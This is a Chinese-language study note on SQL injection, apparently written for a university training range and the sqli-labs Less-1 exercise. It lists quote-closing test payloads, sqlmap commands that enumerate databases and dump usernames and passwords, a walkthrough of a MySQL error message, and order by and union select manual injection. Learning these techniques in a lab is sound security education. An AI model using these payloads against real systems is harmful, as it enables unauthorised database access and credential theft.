# SQL注入
SQL注入是学习过程中第一个接触的漏洞，也是应用比较广泛的漏洞

本笔记基于厦门大学网络安全实训靶场提供的相关工具和靶场进行学习

在笔记的最后会补充一些关于SQL数据库的基础知识

## 原理
用户输入的数据被SQL解释器执行，通过猜测后台的SQL语句，进行恶意的SQL语句查询

正确的SQL查询语句一般为:

`select * from table where id = 'input'`

`select * from table where id = "input"`

`select * from table where id = ("input")`

`select * from table where id = ('input')`

`select * from table where id = ("'input'"")`

## 注入思路
验证漏洞存在-->使用sqlmap工具或webshell手工注入

## 语句速查表
### 1 常用注入测试payload

`' and 1=1 #`

`' or 1=1 --`

`" and 1=1 --`

`" or 1=1 --`

`') and 1=1 --`

`") and 1=1 --`

`'") and 1=1 --`

### 2 常用查询注入语句(分为SQLmap语句和手工注入)
#### SQLmap语句

`sqlmap.py -u "http://IP/Less-1/?id=1" `

`sqlmap.py -u "http://IP/Less-1/?id=1" --current-db`

`sqlmap.py -u "http://IP/Less-1/?id=1" --tables -D "你刚刚查到的数据库名"`

`sqlmap.py -u "http://IP/Less-1/?id=1"  --columns -T "users" -D "你刚刚查到的数据库名"`

`sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security"`




#### 手工注入

## SQL注入学习要点
### (一)验证SQL注入漏洞的存在

举个例子:利用单引号尝试回显`http://IP/Less-1/?id=1 ' or 1=1 --+`  (此处ip为靶场提供的内网地址)得到报错回显 `near ''1'' LIMIT 0,1' at line 1`

除此之外 根据速查表1 我们还能用`"` `'"` `')` `")` `'")`进行注入测试

此处要为初学者解释报错回显的内容

1. 还原现场

原始 SQL 模板大概长这样

`SELECT * FROM users WHERE id='1' LIMIT 0,1`

因此输入后拼接得到的SQL语句为

`SELECT * FROM users WHERE id='1'` `' LIMIT 0,1`

                             └─┬─┘   └────┬────┘
                            你的输入    模板残留

引号配对被打乱：`'1'` 是一个完整的字符串，后面剩下的 `' LIMIT 0,1` 又开了一个字符串，但直到语句结束都没有闭合，词法分析器一路读到底，于是报语法错误。

2. 语句拆解

MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' at line <行号>

==========================================================================================

`片段`---------------`来源`-------------------------`含义`

`near`---------------`报错格式`--------------------`“错误发生在……附近”，后面跟的是出错处原始 SQL 文本`

`最外层的一对 '…'`---`报错格式的定界符`-----------`是 MySQL 用来包裹片段的引号，不属于 SQL。剥掉后真正的片段是 '1'' LIMIT 0,1`

`第 1 个 '`----------`SQL 模板 id='$id'`---------`你输入内容前面的引号，说明注入点位于单引号字符串内部`

`1`-------------------`你的输入`--------------------`你输入的数字被原样带进了报错——证明输入确实进了 SQL，不是被过滤/丢弃`

`第 2 个 '`----------`你的输入（注入的引号）`-----`闭合了 '1' 这个字符串字面量，是整条链路的“开关”`

`第 3 个 '`----------`SQL 模板结尾的引号`---------`本来负责闭合 '$id'，现在被“挤”成了新字符串的开头，造成未闭合`

`LIMIT 0,1`----------`SQL 模板`-------------------`分页子句：LIMIT offset, count，即跳过 0 条、取 1 条。`

`at line 1`----------`报错格式`---------------------`错误在 SQL 语句的第 1 行（整条语句是一行）。不是“你输入的第 1 行”`

==========================================================================================

有了这部分补充知识，你就能看懂后面的内容了

再构造语句`id=1' and 1=1 --+`和`id=1' and 1=2 --+`逻辑上分别为True和False，页面回显也分别正常和错误，所以存在sql注入漏洞


### （二） 开始愉快的注入
#### (1)使用sqlmap工具自动注入(os:使用小飞机发起进攻...)
1. 用Sqlmap查询数据库类型,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1" `

2. 用Sqlmap查询所有数据库，输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1" --current-db`

3. 用Sqlmap查询security库的数据表,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1" --tables -D "你刚刚查到的数据库名"`

4. 用Sqlmap查询users表的所有列,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1"  --columns -T "users" -D "你刚刚查到的数据库名"`

5. 用Sqlmap获取列的内容,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security"`

#### (2) 掌握手工注入的办法(os:如果你没有sqlmap工具，你要怎么发起攻击呢...?)
##### 1. 列字段检测
`order by n`

解释: `order by n`语句用于测试正确的字段数n

##### 2. 手工注入
采用`union select`联合注入法

原理: 在url语句中已经使用了`'`或者其他的字段闭合了前一个sql语句，后面接`union select`表示继续执行下一个查询语句

示例语句:

`id=-1' union select 1,2,3 --+`









## SQL数据库的补充知识
1 注释符号: 常见注释符号为`#` `--`
2 特殊转义符号: 常见转义符号有`+`(在拼接进入sql语句时会自动变成空格)



